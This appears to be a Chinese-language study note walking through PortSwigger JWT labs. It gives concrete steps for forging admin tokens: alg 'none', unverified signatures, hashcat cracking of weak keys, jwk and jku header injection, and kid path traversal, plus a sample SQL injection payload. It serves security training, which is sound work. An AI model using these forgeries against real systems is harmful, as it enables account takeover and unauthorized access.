---
title: JWT
description: JWT
---

<!-- ## 前言

建議先讀過 [Web Tech JWT](../web-tech/jwt.md) -->

## Lab: JWT authentication bypass via unverified signature

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#accepting-arbitrary-signatures                         |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature |

NodeJS 的 [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) 就有提供

### decode

```js
/**
 * Returns the decoded payload without verifying if the signature is valid.
 * token - JWT string to decode
 * [options] - Options for decoding
 * returns - The decoded Token
 */
export function decode(token: string, options: DecodeOptions & { complete: true }): null | Jwt;
```

### verify

```js
/**
 * Synchronously verify given token using a secret or a public key to get a decoded token
 * token - JWT string to verify
 * secretOrPublicKey - Either the secret for HMAC algorithms, or the PEM encoded public key for RSA and ECDSA.
 * [options] - Options for the verification
 * returns - The decoded token.
 */
export function verify(
    token: string,
    secretOrPublicKey: Secret | PublicKey,
    options: VerifyOptions & { complete: true },
): Jwt;
```

如果使用 [decode](#decode) 的話，就會有資安漏洞

這題的 JWT 解出來是

```json
// header
{
  "kid": "c40a9f76-6b83-4785-87dd-a6ba744a376d",
  "alg": "RS256"
}
// payload
{
  "iss": "portswigger",
  "exp": 1761457542,
  "sub": "wiener"
}
```

把 payload 重新包裝

```js
btoa(`{"iss":"portswigger","exp":1761457542,"sub":"administrator"}`);
```

塞回 cookie 就可以成功通關～

## Lab: JWT authentication bypass via flawed signature verification

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#accepting-tokens-with-no-signature                              |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification |

構造

```js
btoa(`{"kid":"4ae5b5dd-6fa4-4f30-a7eb-2f1cf9f77049","alg":"none"}`);
btoa(`{"iss":"portswigger","exp":1761480707,"sub":"administrator"}`);
```

然後拼起來，塞回 cookie，就可以成功通關

## Brute-forcing secret keys using hashcat

https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat

語法

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

- https://hashcat.net/hashcat/
- https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

## Lab: JWT authentication bypass via weak signing key

| Dimension | Description                                                                                 |
| --------- | ------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#brute-forcing-secret-keys-using-hashcat            |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key |

執行

```
hashcat -a 0 -m 16500 eyJraWQiOiIzZDNkYjJkZS0wOTIxLTQ2ODctOTlmYi01NTlkNjA4MzYzNGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MTM0Miwic3ViIjoid2llbmVyIn0.FsQAxYSBT5whQS5blEAuXMu3-z3T97LGBULToAbUz4A "C:\path\to\jwt.secrets.list"
```

結果馬上就找到

```
eyJraWQiOiIzZDNkYjJkZS0wOTIxLTQ2ODctOTlmYi01NTlkNjA4MzYzNGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MTM0Miwic3ViIjoid2llbmVyIn0.FsQAxYSBT5whQS5blEAuXMu3-z3T97LGBULToAbUz4A:secret1
```

用 NodeJS 的 jsonwebtoken 來簽

```js
const token10 = sign(
  { iss: "portswigger", exp: 1761482635, sub: "administrator" },
  "secret1",
  {
    noTimestamp: true,
    keyid: "9c1bd791-418f-46d0-9a5d-e1af3f3da139",
    header: {
      alg: "HS256",
      typ: undefined,
    },
  },
);
console.log(token10);
// eyJhbGciOiJIUzI1NiIsImtpZCI6IjljMWJkNzkxLTQxOGYtNDZkMC05YTVkLWUxYWYzZjNkYTEzOSJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MTQ4MjYzNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.B_3-zDREkzRs_YXGs5_5YUjpqbE_Bo9XnusXoB8bxBU
console.log(decode(token10, { complete: true }));
// {
//   header: { alg: 'HS256', kid: '9c1bd791-418f-46d0-9a5d-e1af3f3da139' },
//   payload: { iss: 'portswigger', exp: 1761482635, sub: 'administrator' },
//   signature: 'B_3-zDREkzRs_YXGs5_5YUjpqbE_Bo9XnusXoB8bxBU'
// }
```

token 塞回 cookie，結束這回合

## JWT header parameter injections

https://portswigger.net/web-security/jwt#jwt-header-parameter-injections

- jwk (JSON Web Key)
- jku (JSON Web Key Set URL)
- kid (Key ID)

## Injecting self-signed JWTs via the jwk parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter

example jwt header

```json
{
  "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
  "typ": "JWT",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
  }
}
```

jwk 要怎麼生成?

- Burp Suite JWT Editor extension
- https://www.npmjs.com/package/jose

## Lab: JWT authentication bypass via jwk header injection

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter       |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection |

這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是

```json
{"kid":"5c287417-9c08-4af3-ad4f-f4f0eaefd8c0","alg":"RS256"}
{"iss":"portswigger","exp":1761530470,"sub":"wiener"}
```

用 Burp Suite JWT Extension 生成一把 jwk

![new-jwk-in-burp](../../static/img/new-jwk-in-burp.jpg)

之後在 burp repeater 生成以下 jwt

```json
{
    "kid": "5c287417-9c08-4af3-ad4f-f4f0eaefd8c0",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "5c287417-9c08-4af3-ad4f-f4f0eaefd8c0",
        "n": "o4j9M7tcX3eTHUopQ3Te2iV46G3b--TKQzTLJL6g04H7qh4DtI0dopdp-290mzi6410Uu7uxYuDOErkNp-xdNWJSbZ3xlnOaoAPDAadwEORwWqpeGvJ6P-OJSb0Um3qidYE6e3HbbBdEPFuhoVyrheX1hA6-wKsUnowpyhKFv-Uo9IBuB5OK7sNpMkl21GA6X7dT9_MCtdK8e6byzA4EF9rR6va2LpP-atYt-uaM4avpRawksx-KjzTpfKI34O45RTCmhOZEy3Y6oZjPTzqpZuttcScBRA4qn012ycRr2LGM22MeOPdvQFBjrApjlU-euLBFWSPTfrocynjLoRMxyQ"
    }
}

{
    "iss": "portswigger",
    "exp": 1761530470,
    "sub": "administrator"
}
```

![burp-gen-jwk-in-repeater](../../static/img/burp-gen-jwk-in-repeater.jpg)

成功解題～

## Injecting self-signed JWTs via the jku parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter

/.well-known/jwks.json

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
      "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
    },
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
      "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
    }
  ]
}
```

## Lab: JWT authentication bypass via jku header injection

| Dimension | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jku-parameter       |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection |

這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是

```json
{"kid":"8dee8308-aca2-4d76-ba57-62de6a74528d","alg":"RS256"}
{"iss":"portswigger","exp":1761555388,"sub":"wiener"}
```

跟上面那題一樣，用 Burp Suite 生成一把 RSA Key，之後構造 jwt 為以下

```json
// header
{
    "jku": "https://exploit-0a8600d604fb3c158b747b550193005a.exploit-server.net/exploit",
    "kid": "8dee8308-aca2-4d76-ba57-62de6a74528d",
    "typ": "JWT",
    "alg": "RS256"
}
// payload
{
    "iss": "portswigger",
    "exp": 1761555736,
    "sub": "administrator"
}
```

並且在 exploit-sever 回傳以下 response body

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "8dee8308-aca2-4d76-ba57-62de6a74528d",
      "n": "rQxlCvAL6iKBCwGkulExvykIRR5kyvLnKhKRVIQ20pLnw4dpUlWUrJXKlg-7HrdEF6RCHBH1Tv8W1l0wLC1YTnDU92iaNi3Zks9519NaS3Ze1oQ2EuacArcIQ6LrHyeiXRJgufkCAiBQflZXquyBedZ7BXGjUCZUjNsrWXf18ZI_wBCBpKnhJflDESVG7VF_Xfrkke20J_7vLxhP7b6ulwVisfA97lM_nQfXeLyQBwDWVwOBsAUOefESdZ--fdW0EtU3NgM3grNFW_TaMLQcSdJ8QTUr0Mt4NpEjaPcJxhsVoC6RzfqUz5j-GyJNumNJKPSGdXfCc17Pv18YSqmL0w"
    }
  ]
}
```

之後把 token 塞回 cookie，成功解題～

## Injecting self-signed JWTs via the kid parameter

https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter

- Path traversal

```json
{
  "kid": "/dev/null", // empty string
  "typ": "JWT",
  "alg": "HS256",
  "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

- SQLi

```json
{
  "kid": "' UNION SELECT 'hello'",
  "typ": "JWT",
  "alg": "HS256",
  "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

## Lab: JWT authentication bypass via kid header path traversal

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter            |
| Lab       | https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal |

這題用 `wiener:peter` 登入後，拿到的 jwt token 解出來是

```json
{"kid":"9c1bd791-418f-46d0-9a5d-e1af3f3da139","alg":"HS256"}
{"iss":"portswigger","exp":1761482635,"sub":"wiener"}
```

Burp Suite 好像無法生成空字串的 key (?)，[jwt.io](https://www.jwt.io/) 也不讓，嘗試用 [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken) 9.0.2 也不行，但只要把這段註解就可以

node_modules/jsonwebtoken/sign.js

```js
if (!secretOrPrivateKey && options.algorithm !== "none") {
  return failure(new Error("secretOrPrivateKey must have a value"));
}
```

生成 token

```js
const token11 = sign(
  { iss: "portswigger", exp: 1761565652, sub: "administrator" },
  "",
  {
    noTimestamp: true,
    keyid: "../../../../../../../../../../dev/null",
    header: {
      alg: "HS256",
      typ: undefined,
    },
  },
);
console.log(token11);
const decodeResult = decode(token11, { complete: true });
console.log(decodeResult);
```

用多個 ../ 是因為我們不知道目錄有幾層深，所以用多個確保可以跳到 filesystem root，多餘的 ../ 會被忽略

一樣，把 token 塞回 cookie，成功解題～

## 參考資料

- https://portswigger.net/web-security/jwt
